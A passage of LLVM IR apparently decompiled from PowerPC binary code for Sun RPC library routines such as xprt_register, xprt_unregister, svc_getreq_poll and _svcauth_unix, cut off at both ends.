dec_label_pc_10023a8c:                            ; preds = %dec_label_pc_10023a54, %dec_label_pc_10023a70
  %v0_10023a8c = load i32, i32* @r27, align 4
  %v3_10023a8c = icmp eq i32 %v0_10023a8c, 0
  br i1 %v3_10023a8c, label %dec_label_pc_10023ab8, label %dec_label_pc_10023aa4

dec_label_pc_10023aa4:                            ; preds = %dec_label_pc_10023a8c
  %v0_10023a94 = load i32, i32* @r29, align 4
  %v0_10023a90 = load i32, i32* @r30, align 4
  %v0_10023aa4 = load i32, i32* @r26, align 4
  %v1_10023aa4 = add i32 %v0_10023aa4, 4
  %v2_10023aa4 = inttoptr i32 %v1_10023aa4 to i16*
  %v3_10023aa4 = load i16, i16* %v2_10023aa4, align 2
  %v4_10023aa4 = zext i16 %v3_10023aa4 to i32
  store i32 268581548, i32* @lr, align 4
  %v4_10023aa8 = call i32 @pmap_set(i32 %v0_10023a90, i32 %v0_10023a94, i32 %v0_10023a8c, i32 %v4_10023aa4)
  br label %dec_label_pc_10023ab8

dec_label_pc_10023ab4:                            ; preds = %dec_label_pc_10023a54, %dec_label_pc_10023a64
  br label %dec_label_pc_10023ab8

dec_label_pc_10023ab8:                            ; preds = %dec_label_pc_10023a8c, %dec_label_pc_10023aa4, %dec_label_pc_10023ab4
  %v0_10023ab8 = phi i32 [ 1, %dec_label_pc_10023a8c ], [ %v4_10023aa8, %dec_label_pc_10023aa4 ], [ 0, %dec_label_pc_10023ab4 ]
  ret i32 %v0_10023ab8

; uselistorder directives
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @svc_find, { 1, 0 }
  uselistorder label %dec_label_pc_10023ab8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10023ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10023a8c, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10023ae4 = load i32, i32* %arg1, align 4
  store i32 %v2_10023ae4, i32* @r31, align 4
  store i32 268581612, i32* @lr, align 4
  %v0_10023ae8 = call i32 @_rpc_dtablesize()
  store i32 %v0_10023ae8, i32* %r3.global-to-local, align 4
  %v2_10023aec = icmp slt i32 %v2_10023ae4, %v0_10023ae8
  br i1 %v2_10023aec, label %dec_label_pc_10023af4, label %dec_label_pc_10023b78

dec_label_pc_10023af4:                            ; preds = %entry
  store i32 268581624, i32* @lr, align 4
  %v0_10023af4 = call i32 @__rpc_thread_variables()
  store i32 %v0_10023af4, i32* %r3.global-to-local, align 4
  %v1_10023af8 = mul i32 %v2_10023ae4, 4
  %v1_10023afc = add i32 %v0_10023af4, 180
  %v2_10023afc = inttoptr i32 %v1_10023afc to i32*
  %v3_10023afc = load i32, i32* %v2_10023afc, align 4
  %v2_10023b00 = add i32 %v3_10023afc, %v1_10023af8
  %v3_10023b00 = inttoptr i32 %v2_10023b00 to i32*
  %v4_10023b00 = load i32, i32* %v3_10023b00, align 4
  %v1_10023b04 = load i32, i32* @r30, align 4
  %v4_10023b04 = icmp eq i32 %v4_10023b00, %v1_10023b04
  br i1 %v4_10023b04, label %dec_label_pc_10023b0c, label %dec_label_pc_10023b78

dec_label_pc_10023b0c:                            ; preds = %dec_label_pc_10023af4
  %v2_10023b0c = icmp sgt i32 %v2_10023ae4, 1023
  store i32 0, i32* %v3_10023b00, align 4
  br i1 %v2_10023b0c, label %dec_label_pc_10023b3c, label %dec_label_pc_10023b1c

dec_label_pc_10023b1c:                            ; preds = %dec_label_pc_10023b0c
  store i32 268581664, i32* @lr, align 4
  %v0_10023b1c = load i32, i32* %r3.global-to-local, align 4
  %v2_10023b1c = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10023b1c, i32 %v1_10023af8)
  store i32 %v2_10023b1c, i32* %r3.global-to-local, align 4
  %v1_10023b20 = call i32 @__asm_rlwinm(i32 %v2_10023ae4, i32 29, i32 3, i32 29)
  store i32 %v1_10023b20, i32* @r10, align 4
  %v2_10023b24 = add i32 %v1_10023b20, %v2_10023b1c
  %v3_10023b24 = inttoptr i32 %v2_10023b24 to i32*
  %v4_10023b24 = load i32, i32* %v3_10023b24, align 4
  %v1_10023b28 = urem i32 %v2_10023ae4, 32
  %v3_10023b30 = shl i32 -2, %v1_10023b28
  %v4_10023b30 = sub nsw i32 32, %v1_10023b28
  %v5_10023b30 = lshr i32 -2, %v4_10023b30
  %v6_10023b30 = or i32 %v5_10023b30, %v3_10023b30
  %v2_10023b34 = and i32 %v4_10023b24, %v6_10023b30
  store i32 %v2_10023b34, i32* %v3_10023b24, align 4
  br label %dec_label_pc_10023b3c

dec_label_pc_10023b3c:                            ; preds = %dec_label_pc_10023b0c, %dec_label_pc_10023b1c
  store i32 0, i32* @r30, align 4
  store i32 268581740, i32* @lr, align 4
  %v0_10023b681 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023b681, i32* %r3.global-to-local, align 4
  %v1_10023b6c2 = inttoptr i32 %v0_10023b681 to i32*
  %v2_10023b6c3 = load i32, i32* %v1_10023b6c2, align 4
  %v0_10023b704 = load i32, i32* @r30, align 4
  %v2_10023b705 = icmp slt i32 %v0_10023b704, %v2_10023b6c3
  br i1 %v2_10023b705, label %dec_label_pc_10023b44, label %dec_label_pc_10023b78

dec_label_pc_10023b44:                            ; preds = %dec_label_pc_10023b3c, %dec_label_pc_10023b68.backedge
  store i32 268581704, i32* @lr, align 4
  %v0_10023b44 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023b44, i32* %r3.global-to-local, align 4
  %v0_10023b48 = load i32, i32* @r30, align 4
  %v1_10023b48 = mul i32 %v0_10023b48, 8
  %v1_10023b4c = inttoptr i32 %v0_10023b44 to i32*
  %v2_10023b4c = load i32, i32* %v1_10023b4c, align 4
  store i32 %v2_10023b4c, i32* %r3.global-to-local, align 4
  %v1_10023b50 = add i32 %v0_10023b48, 1
  store i32 %v1_10023b50, i32* @r30, align 4
  %v2_10023b54 = add i32 %v2_10023b4c, %v1_10023b48
  %v3_10023b54 = inttoptr i32 %v2_10023b54 to i32*
  %v4_10023b54 = load i32, i32* %v3_10023b54, align 4
  %v4_10023b58 = icmp eq i32 %v4_10023b54, %v2_10023ae4
  br i1 %v4_10023b58, label %dec_label_pc_10023b60, label %dec_label_pc_10023b68.backedge

dec_label_pc_10023b60:                            ; preds = %dec_label_pc_10023b44
  store i32 -1, i32* %v3_10023b54, align 4
  br label %dec_label_pc_10023b68.backedge

dec_label_pc_10023b68.backedge:                   ; preds = %dec_label_pc_10023b60, %dec_label_pc_10023b44
  store i32 268581740, i32* @lr, align 4
  %v0_10023b68 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023b68, i32* %r3.global-to-local, align 4
  %v1_10023b6c = inttoptr i32 %v0_10023b68 to i32*
  %v2_10023b6c = load i32, i32* %v1_10023b6c, align 4
  %v0_10023b70 = load i32, i32* @r30, align 4
  %v2_10023b70 = icmp slt i32 %v0_10023b70, %v2_10023b6c
  br i1 %v2_10023b70, label %dec_label_pc_10023b44, label %dec_label_pc_10023b78

dec_label_pc_10023b78:                            ; preds = %dec_label_pc_10023b68.backedge, %dec_label_pc_10023b3c, %dec_label_pc_10023af4, %entry
  %v0_10023b88 = phi i32 [ %v0_10023af4, %dec_label_pc_10023af4 ], [ %v0_10023ae8, %entry ], [ %v0_10023b681, %dec_label_pc_10023b3c ], [ %v0_10023b68, %dec_label_pc_10023b68.backedge ]
  ret i32 %v0_10023b88

; uselistorder directives
  uselistorder i32 %v0_10023b48, { 1, 0 }
  uselistorder i32 %v2_10023ae4, { 4, 0, 2, 3, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 8, 4, 5, 6, 7, 0 }
  uselistorder i32 268581740, { 1, 0 }
  uselistorder label %dec_label_pc_10023b44, { 1, 0 }
  uselistorder label %dec_label_pc_10023b3c, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 0, i32* @r30, align 4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10023bf8

dec_label_pc_10023bb0:                            ; preds = %dec_label_pc_10023bf8
  %v3_10023bb0 = inttoptr i32 %v2_10023c08 to i32*
  %v4_10023bb0 = load i32, i32* %v3_10023bb0, align 4
  store i32 %v4_10023bb0, i32* @r31, align 4
  %v3_10023bb4 = icmp eq i32 %v4_10023bb0, -1
  br i1 %v3_10023bb4, label %dec_label_pc_10023bf4, label %dec_label_pc_10023bbc

dec_label_pc_10023bbc:                            ; preds = %dec_label_pc_10023bb0
  %v1_10023bbc = add i32 %v2_10023c08, 6
  %v2_10023bbc = inttoptr i32 %v1_10023bbc to i16*
  %v3_10023bbc = load i16, i16* %v2_10023bbc, align 2
  %v3_10023bc0 = icmp eq i16 %v3_10023bbc, 0
  br i1 %v3_10023bc0, label %dec_label_pc_10023bf4, label %dec_label_pc_10023bcc

dec_label_pc_10023bcc:                            ; preds = %dec_label_pc_10023bbc
  %v1_10023bc4 = and i16 %v3_10023bbc, 32
  %v3_10023bc4 = icmp eq i16 %v1_10023bc4, 0
  %v1_10023bd0 = add i32 %v0_10023c04, 1
  store i32 %v1_10023bd0, i32* @r29, align 4
  br i1 %v3_10023bc4, label %dec_label_pc_10023bf0, label %dec_label_pc_10023bd8

dec_label_pc_10023bd8:                            ; preds = %dec_label_pc_10023bcc
  store i32 268581852, i32* @lr, align 4
  %v0_10023bd8 = call i32 @__rpc_thread_variables()
  %v0_10023bdc = load i32, i32* @r31, align 4
  %v1_10023bdc = mul i32 %v0_10023bdc, 4
  %v1_10023be0 = add i32 %v0_10023bd8, 180
  %v2_10023be0 = inttoptr i32 %v1_10023be0 to i32*
  %v3_10023be0 = load i32, i32* %v2_10023be0, align 4
  %v2_10023be4 = add i32 %v3_10023be0, %v1_10023bdc
  %v3_10023be4 = inttoptr i32 %v2_10023be4 to i32*
  %v4_10023be4 = load i32, i32* %v3_10023be4, align 4
  store i32 ptrtoint (i32* @global_var_10023bec.1318 to i32), i32* @lr, align 4
  %v2_10023be8 = inttoptr i32 %v4_10023be4 to i32*
  %v3_10023be8 = call i32 @xprt_unregister(i32* %v2_10023be8, i32 %v3_10023be0)
  br label %dec_label_pc_10023bf4

dec_label_pc_10023bf0:                            ; preds = %dec_label_pc_10023bcc
  store i32 268581876, i32* @lr, align 4
  %v1_10023bf0 = call i32 @svc_getreq_common(i32 %v4_10023bb0)
  br label %dec_label_pc_10023bf4

dec_label_pc_10023bf4:                            ; preds = %dec_label_pc_10023bbc, %dec_label_pc_10023bb0, %dec_label_pc_10023bd8, %dec_label_pc_10023bf0
  %v0_10023bf4 = load i32, i32* @r30, align 4
  %v1_10023bf4 = add i32 %v0_10023bf4, 1
  store i32 %v1_10023bf4, i32* @r30, align 4
  br label %dec_label_pc_10023bf8

dec_label_pc_10023bf8:                            ; preds = %entry, %dec_label_pc_10023bf4
  store i32 268581884, i32* @lr, align 4
  %v0_10023bf8 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_10023bfc = load i32, i32* @r30, align 4
  %v1_10023bfc = mul i32 %v0_10023bfc, 8
  %v1_10023c00 = inttoptr i32 %v0_10023bf8 to i32*
  %v2_10023c00 = load i32, i32* %v1_10023c00, align 4
  %v0_10023c04 = load i32, i32* @r29, align 4
  %v1_10023c04 = load i32, i32* @r27, align 4
  %v2_10023c04 = icmp slt i32 %v0_10023c04, %v1_10023c04
  %v0_10023c08 = load i32, i32* @r28, align 4
  %v2_10023c08 = add i32 %v0_10023c08, %v1_10023bfc
  %v2_10023c0c = icmp slt i32 %v0_10023bfc, %v2_10023c00
  %brmerge.demorgan = and i1 %v2_10023c0c, %v2_10023c04
  br i1 %brmerge.demorgan, label %dec_label_pc_10023bb0, label %dec_label_pc_10023c18

dec_label_pc_10023c18:                            ; preds = %dec_label_pc_10023bf8
  ret i32 %v0_10023bf8

; uselistorder directives
  uselistorder i32 %v2_10023c08, { 1, 0 }
  uselistorder i32 %v0_10023c04, { 1, 0 }
  uselistorder i32 %v0_10023bfc, { 1, 0 }
  uselistorder i32 %v3_10023be0, { 1, 0 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_10023bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10023bf4, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268581956, i32* @lr, align 4
  %v0_10023c40 = call i32 @__rpc_thread_variables()
  store i32 %v0_10023c40, i32* %r3.global-to-local, align 4
  %v1_10023c44 = add i32 %v0_10023c40, 180
  %v2_10023c44 = inttoptr i32 %v1_10023c44 to i32*
  %v3_10023c44 = load i32, i32* %v2_10023c44, align 4
  store i32 %v0_10023c40, i32* @r31, align 4
  %v0_10023c4c = load i32, i32* @r30, align 4
  %v1_10023c4c = inttoptr i32 %v0_10023c4c to i32*
  %v2_10023c4c = load i32, i32* %v1_10023c4c, align 4
  %v3_10023c50 = icmp eq i32 %v3_10023c44, 0
  br i1 %v3_10023c50, label %dec_label_pc_10023c58, label %dec_label_pc_10023c70

dec_label_pc_10023c58:                            ; preds = %entry
  store i32 268581980, i32* @lr, align 4
  %v0_10023c58 = call i32 @_rpc_dtablesize()
  %v1_10023c5c = mul i32 %v0_10023c58, 4
  store i32 %v1_10023c5c, i32* @r3, align 4
  store i32 268581988, i32* @lr, align 4
  %v0_10023c60 = call i32 @malloc()
  store i32 %v0_10023c60, i32* %r3.global-to-local, align 4
  %v3_10023c64 = icmp eq i32 %v0_10023c60, 0
  %v1_10023c68 = load i32, i32* @r31, align 4
  %v2_10023c68 = add i32 %v1_10023c68, 180
  %v3_10023c68 = inttoptr i32 %v2_10023c68 to i32*
  store i32 %v0_10023c60, i32* %v3_10023c68, align 4
  br i1 %v3_10023c64, label %dec_label_pc_10023d54, label %dec_label_pc_10023c70

dec_label_pc_10023c70:                            ; preds = %entry, %dec_label_pc_10023c58
  store i32 268582004, i32* @lr, align 4
  %v0_10023c70 = call i32 @_rpc_dtablesize()
  store i32 %v0_10023c70, i32* %r3.global-to-local, align 4
  %v2_10023c74 = icmp slt i32 %v2_10023c4c, %v0_10023c70
  br i1 %v2_10023c74, label %dec_label_pc_10023c7c, label %dec_label_pc_10023d54

dec_label_pc_10023c7c:                            ; preds = %dec_label_pc_10023c70
  %v0_10023c7c = load i32, i32* @r31, align 4
  %v1_10023c7c = add i32 %v0_10023c7c, 180
  %v2_10023c7c = inttoptr i32 %v1_10023c7c to i32*
  %v3_10023c7c = load i32, i32* %v2_10023c7c, align 4
  store i32 %v3_10023c7c, i32* %r9.global-to-local, align 4
  %v2_10023c80 = icmp sgt i32 %v2_10023c4c, 1023
  %v1_10023c84 = mul i32 %v2_10023c4c, 4
  %v0_10023c88 = load i32, i32* @r30, align 4
  %v3_10023c88 = add i32 %v3_10023c7c, %v1_10023c84
  %v4_10023c88 = inttoptr i32 %v3_10023c88 to i32*
  store i32 %v0_10023c88, i32* %v4_10023c88, align 4
  br i1 %v2_10023c80, label %dec_label_pc_10023cb0, label %dec_label_pc_10023c90

dec_label_pc_10023c90:                            ; preds = %dec_label_pc_10023c7c
  store i32 268582036, i32* @lr, align 4
  %v0_10023c90 = load i32, i32* %r3.global-to-local, align 4
  %v2_10023c90 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10023c90, i32 %v3_10023c7c)
  store i32 %v2_10023c90, i32* %r3.global-to-local, align 4
  %v1_10023c94 = call i32 @__asm_rlwinm(i32 %v2_10023c4c, i32 29, i32 3, i32 29)
  store i32 %v1_10023c94, i32* @r10, align 4
  %v2_10023c98 = add i32 %v1_10023c94, %v2_10023c90
  %v3_10023c98 = inttoptr i32 %v2_10023c98 to i32*
  %v4_10023c98 = load i32, i32* %v3_10023c98, align 4
  %v1_10023c9c = urem i32 %v2_10023c4c, 32
  %v3_10023ca4 = shl i32 1, %v1_10023c9c
  %v2_10023ca8 = or i32 %v4_10023c98, %v3_10023ca4
  store i32 %v2_10023ca8, i32* %r9.global-to-local, align 4
  store i32 %v2_10023ca8, i32* %v3_10023c98, align 4
  br label %dec_label_pc_10023cb0

dec_label_pc_10023cb0:                            ; preds = %dec_label_pc_10023c7c, %dec_label_pc_10023c90
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10023cf0

dec_label_pc_10023cb8:                            ; preds = %dec_label_pc_10023cf0
  store i32 268582076, i32* @lr, align 4
  %v0_10023cb8 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023cb8, i32* %r3.global-to-local, align 4
  %v1_10023cbc = inttoptr i32 %v0_10023cb8 to i32*
  %v2_10023cbc = load i32, i32* %v1_10023cbc, align 4
  store i32 %v0_10023cb8, i32* %r9.global-to-local, align 4
  %v0_10023cc4 = load i32, i32* @r31, align 4
  %v1_10023cc4 = mul i32 %v0_10023cc4, 8
  store i32 %v1_10023cc4, i32* %r3.global-to-local, align 4
  %v1_10023cc8 = add i32 %v0_10023cc4, 1
  store i32 %v1_10023cc8, i32* @r31, align 4
  %v2_10023ccc = add i32 %v1_10023cc4, %v2_10023cbc
  %v3_10023ccc = inttoptr i32 %v2_10023ccc to i32*
  %v4_10023ccc = load i32, i32* %v3_10023ccc, align 4
  %v3_10023cd0 = icmp eq i32 %v4_10023ccc, -1
  br i1 %v3_10023cd0, label %dec_label_pc_10023cd8, label %dec_label_pc_10023cf0

dec_label_pc_10023cd8:                            ; preds = %dec_label_pc_10023cb8
  store i32 %v2_10023c4c, i32* %v3_10023ccc, align 4
  %v0_10023ce0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10023ce0 = inttoptr i32 %v0_10023ce0 to i32*
  %v2_10023ce0 = load i32, i32* %v1_10023ce0, align 4
  %v1_10023ce4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10023ce4 = add i32 %v1_10023ce4, %v2_10023ce0
  store i32 %v2_10023ce4, i32* %r9.global-to-local, align 4
  %v3_10023ce8 = add i32 %v2_10023ce4, 4
  %v4_10023ce8 = inttoptr i32 %v3_10023ce8 to i16*
  store i16 195, i16* %v4_10023ce8, align 2
  br label %dec_label_pc_10023d54

dec_label_pc_10023cf0:                            ; preds = %dec_label_pc_10023cb8, %dec_label_pc_10023cb0
  store i32 268582132, i32* @lr, align 4
  %v0_10023cf0 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023cf0, i32* %r3.global-to-local, align 4
  %v1_10023cf4 = inttoptr i32 %v0_10023cf0 to i32*
  %v2_10023cf4 = load i32, i32* %v1_10023cf4, align 4
  store i32 %v0_10023cf0, i32* @r30, align 4
  %v0_10023cfc = load i32, i32* @r31, align 4
  %v2_10023cfc = icmp slt i32 %v0_10023cfc, %v2_10023cf4
  br i1 %v2_10023cfc, label %dec_label_pc_10023cb8, label %dec_label_pc_10023d04

dec_label_pc_10023d04:                            ; preds = %dec_label_pc_10023cf0
  %v1_10023d04 = add i32 %v2_10023cf4, 1
  store i32 %v1_10023d04, i32* @r29, align 4
  store i32 %v1_10023d04, i32* %v1_10023cf4, align 4
  store i32 268582160, i32* @lr, align 4
  %v0_10023d0c = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023d0c, i32* %r3.global-to-local, align 4
  %v0_10023d10 = load i32, i32* @r29, align 4
  %v1_10023d10 = mul i32 %v0_10023d10, 8
  %v1_10023d18 = inttoptr i32 %v0_10023d0c to i32*
  %v2_10023d18 = load i32, i32* %v1_10023d18, align 4
  store i32 %v2_10023d18, i32* %r3.global-to-local, align 4
  store i32 268582176, i32* @lr, align 4
  %v2_10023d1c = call i32 @realloc(i32 %v2_10023d18, i32 %v1_10023d10)
  store i32 %v2_10023d1c, i32* %r3.global-to-local, align 4
  %v3_10023d20 = icmp eq i32 %v2_10023d1c, 0
  %v1_10023d24 = load i32, i32* @r31, align 4
  %v2_10023d24 = inttoptr i32 %v1_10023d24 to i32*
  store i32 %v2_10023d1c, i32* %v2_10023d24, align 4
  br i1 %v3_10023d20, label %dec_label_pc_10023d54, label %dec_label_pc_10023d2c

dec_label_pc_10023d2c:                            ; preds = %dec_label_pc_10023d04
  %v0_10023d2c = load i32, i32* @r30, align 4
  %v1_10023d2c = inttoptr i32 %v0_10023d2c to i32*
  %v2_10023d2c = load i32, i32* %v1_10023d2c, align 4
  %v1_10023d30 = mul i32 %v2_10023d2c, 8
  %v1_10023d34 = load i32, i32* %r3.global-to-local, align 4
  %v2_10023d34 = add i32 %v1_10023d34, %v1_10023d30
  store i32 %v2_10023d34, i32* %r9.global-to-local, align 4
  %v2_10023d38 = add i32 %v2_10023d34, -8
  %v3_10023d38 = inttoptr i32 %v2_10023d38 to i32*
  store i32 %v2_10023c4c, i32* %v3_10023d38, align 4
  %v0_10023d3c = load i32, i32* @r30, align 4
  %v1_10023d3c = inttoptr i32 %v0_10023d3c to i32*
  %v2_10023d3c = load i32, i32* %v1_10023d3c, align 4
  store i32 %v2_10023d3c, i32* %r9.global-to-local, align 4
  %v0_10023d40 = load i32, i32* @r31, align 4
  %v1_10023d40 = inttoptr i32 %v0_10023d40 to i32*
  %v2_10023d40 = load i32, i32* %v1_10023d40, align 4
  %v1_10023d44 = mul i32 %v2_10023d3c, 8
  %v2_10023d48 = add i32 %v2_10023d40, %v1_10023d44
  store i32 %v2_10023d48, i32* %r9.global-to-local, align 4
  %v3_10023d50 = add i32 %v2_10023d48, -4
  %v4_10023d50 = inttoptr i32 %v3_10023d50 to i16*
  store i16 195, i16* %v4_10023d50, align 2
  br label %dec_label_pc_10023d54

dec_label_pc_10023d54:                            ; preds = %dec_label_pc_10023c70, %dec_label_pc_10023d04, %dec_label_pc_10023c58, %dec_label_pc_10023cd8, %dec_label_pc_10023d2c
  %v0_10023d64 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10023d64

; uselistorder directives
  uselistorder i32 %v1_10023cc4, { 1, 0 }
  uselistorder i32 %v0_10023cc4, { 1, 0 }
  uselistorder i32 %v3_10023c7c, { 1, 0, 2 }
  uselistorder i32 %v2_10023c4c, { 5, 4, 0, 2, 1, 6, 3 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 11, 13, 14, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 1, 0 }
  uselistorder i16 195, { 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1023, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10023d54, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10023cb0, { 1, 0 }
  uselistorder label %dec_label_pc_10023c70, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10023d88 = add i32 %arg1, 28
  %v2_10023d88 = inttoptr i32 %v1_10023d88 to i32*
  %v3_10023d88 = load i32, i32* %v2_10023d88, align 4
  %v3_10023d8c = load i32, i32* @global_var_1004eeb8.1300, align 4
  %v2_10023d90 = add i32 %v3_10023d88, 32
  %v3_10023d90 = inttoptr i32 %v2_10023d90 to i32*
  store i32 %v3_10023d8c, i32* %v3_10023d90, align 4
  %v1_10023d98 = add i32 %arg1, 12
  %v2_10023d98 = inttoptr i32 %v1_10023d98 to i32*
  %v3_10023d98 = load i32, i32* %v2_10023d98, align 4
  %v3_10023d9c = load i32, i32* %v2_10023d88, align 4
  %v1_10023da4 = mul i32 %v3_10023d98, 4
  store i32 %v1_10023da4, i32* %r11.global-to-local, align 4
  %v2_10023dac = add i32 %v3_10023d9c, 40
  %v3_10023dac = inttoptr i32 %v2_10023dac to i32*
  store i32 0, i32* %v3_10023dac, align 4
  %v0_10023dbc = load i32, i32* %r11.global-to-local, align 4
  %v2_10023dbc = add i32 %v0_10023dbc, ptrtoint (i32* @global_var_1002fa74.1319 to i32)
  %v3_10023dbc = inttoptr i32 %v2_10023dbc to i32*
  %v4_10023dbc = load i32, i32* %v3_10023dbc, align 4
  store i32 %v4_10023dbc, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10023dbc)
  store i32 %arg1, i32* @r10, align 4
  ret i32 %arg1
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10023df4 = load i32, i32* @lr, align 4
  store i32 %v0_10023df4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r27, align 4
  %v2_10023e08 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10023e08, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r26, align 4
  %v1_10023e10 = add i32 %arg1, 24
  %v2_10023e10 = inttoptr i32 %v1_10023e10 to i32*
  %v3_10023e10 = load i32, i32* %v2_10023e10, align 4
  store i32 %v3_10023e10, i32* %r30.global-to-local, align 4
  store i32 %v2_10023e08, i32* %r3.global-to-local, align 4
  %v1_10023e18 = add i32 %v3_10023e10, 24
  store i32 %v1_10023e18, i32* %r0.global-to-local, align 4
  %v1_10023e1c = add i32 %v3_10023e10, 280
  store i32 %v1_10023e1c, i32* %r9.global-to-local, align 4
  %v2_10023e20 = add i32 %v3_10023e10, 4
  %v3_10023e20 = inttoptr i32 %v2_10023e20 to i32*
  store i32 %v1_10023e18, i32* %v3_10023e20, align 4
  %v0_10023e24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10023e24 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023e24 = add i32 %v1_10023e24, 20
  %v3_10023e24 = inttoptr i32 %v2_10023e24 to i32*
  store i32 %v0_10023e24, i32* %v3_10023e24, align 4
  %v1_10023e28 = add i32 %arg2, 32
  %v2_10023e28 = inttoptr i32 %v1_10023e28 to i32*
  %v3_10023e28 = load i32, i32* %v2_10023e28, align 4
  store i32 %v3_10023e28, i32* %r28.global-to-local, align 4
  %v1_10023e2c = add i32 %arg2, 28
  %v2_10023e2c = inttoptr i32 %v1_10023e2c to i32*
  %v3_10023e2c = load i32, i32* %v2_10023e2c, align 4
  %v5_10023e34 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v3_10023e2c, i32 %v3_10023e28, i32 1)
  %v3_10023e38 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023e38, i32* %r9.global-to-local, align 4
  store i32 %v2_10023e08, i32* %r3.global-to-local, align 4
  %v1_10023e44 = add i32 %v3_10023e38, 24
  %v2_10023e44 = inttoptr i32 %v1_10023e44 to i32*
  %v3_10023e44 = load i32, i32* %v2_10023e44, align 4
  store i32 %v3_10023e44, i32* %r9.global-to-local, align 4
  store i32 %v3_10023e44, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10023e44)
  %v0_10023e50 = load i32, i32* %r3.global-to-local, align 4
  %v3_10023e50 = icmp eq i32 %v0_10023e50, 0
  br i1 %v3_10023e50, label %dec_label_pc_10023f30, label %dec_label_pc_10023e58

dec_label_pc_10023e58:                            ; preds = %entry
  %v2_10023e58 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_10023e58, i32* %r0.global-to-local, align 4
  %v2_10023e5c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10023e5c, i32* %r29.global-to-local, align 4
  %v1_10023e60 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023e60 = inttoptr i32 %v1_10023e60 to i32*
  store i32 %v2_10023e58, i32* %v2_10023e60, align 4
  %v3_10023e64 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023e64, i32* %r31.global-to-local, align 4
  %v2_10023e68 = icmp ugt i32 %v3_10023e64, 255
  br i1 %v2_10023e68, label %dec_label_pc_10023f9c, label %dec_label_pc_10023e70

dec_label_pc_10023e70:                            ; preds = %dec_label_pc_10023e58
  %v0_10023e70 = load i32, i32* %r30.global-to-local, align 4
  %v1_10023e70 = add i32 %v0_10023e70, 4
  %v2_10023e70 = inttoptr i32 %v1_10023e70 to i32*
  %v3_10023e70 = load i32, i32* %v2_10023e70, align 4
  store i32 %v3_10023e70, i32* @r3, align 4
  %v2_10023e74 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10023e74, i32* %r29.global-to-local, align 4
